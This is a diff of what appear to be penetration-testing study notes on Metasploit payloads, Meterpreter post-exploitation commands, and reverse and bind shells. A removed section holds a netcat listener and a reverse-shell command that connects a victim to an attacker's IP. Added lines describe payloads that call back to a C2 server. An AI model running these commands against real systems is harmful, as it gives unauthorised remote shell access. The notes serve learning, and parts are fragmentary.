@@ -762,7 +762,11 @@ After the exploit is successful,
 - `ifconfig`
 - `pwd`
 
+  **Creating a custom payload with Metasploit**
 
+  - You can deliver payloads by exploiting vulnerabilities in services/OS or by social engineering - with either method you have to deliver a payload
+
+  - Goal of the payload is to have the victim call back to hacker's C2 server C2 server with SYN packets
 
 **Meterpreter**
 
@@ -815,6 +819,10 @@ Once we've connected to a Meterpreter session, we can run many other commands to
   - `run win_enum`: Runs a comprehensive suite of Windows enumerations and stores the results on the attacking machine.
 
 
+
+
+
+
 **Payload types**
 
 - Payloads are **staged** (the payload is assembled in multiple parts) or **stageless** (all sent at once). A large size payload is likely to fail
@@ -841,13 +849,6 @@ Once we've connected to a Meterpreter session, we can run many other commands to
 - Alternatively a bin shell means that we connect to a target - usually used when reverse shell is not working
 - poping a shell means gaining access to a machine
 
-**Reverse Shell**
--`nc -nvlp 4444` attack box (lvp means listening verbose port)
--`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
-- Whenever a victim connects back to 
-
-**Bin shell**
-- You send an exploit to the victim's machine and then open a port there. Next you connect to it via your attacking VM once the port is established. All of this is done using Netcat
 
 **Payload** it is the exploit- there are various different options. You send it to a victim and then attempt to open a shell in the victim. It is either staged or unstaged
 - Windows type
